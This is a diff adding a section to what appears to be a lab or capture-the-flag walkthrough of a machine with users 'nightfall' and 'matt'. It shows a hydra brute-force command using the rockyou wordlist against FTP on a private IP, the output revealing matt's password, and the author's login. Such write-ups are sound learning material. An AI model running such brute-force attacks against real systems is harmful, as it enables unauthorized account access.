@@ -55,3 +55,22 @@ S-1-22-1-1001 Unix User\matt (Local User)
 ```
 
 So far, I haven't had to brute force any remote users, though I have obviously used rockyou in offline attacks. So, with the above accounts, I need to do a remote brute force against either the ftp or ssh accounts (I assume).
+
+## Bruteforce and FTP
+
+I used hydra and rockyou against the ftp with nightfall, but it didn't get anywhere. Doing the same with matt however finished almost immediately:
+
+`hydra -l matt -P rockyou.txt ftp://192.168.1.106`:
+
+```
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-15 18:27:02
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://192.168.1.106:21/
+[21][ftp] host: 192.168.1.106   login: matt   password: cheese
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-15 18:27:38
+```
+
+I logged into FTP via the above credentials, and it appeared to be matt's home folder. However almost nothing in it was accessible to me.
